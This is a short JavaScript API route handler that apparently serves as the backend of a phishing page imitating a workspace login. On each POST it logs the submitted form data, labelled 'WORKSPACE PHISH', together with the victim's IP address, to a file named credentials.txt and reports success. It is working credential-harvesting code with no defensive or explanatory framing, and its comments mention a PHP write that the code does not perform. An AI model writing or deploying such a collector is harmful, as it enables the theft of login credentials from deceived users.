export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = await req.body;
    
    // WRITE TO PHP-FRIENDLY FORMAT
    const log = `[${new Date().toISOString()}] WORKSPACE PHISH | IP:${req.headers['x-forwarded-for'] || req.socket.remoteAddress} | ${JSON.stringify(data)}\n`;
    
    // DUAL WRITE: file + PHP
    require('fs').appendFileSync('credentials.txt', log);
    
    res.status(200).json({ success: true });
  }
}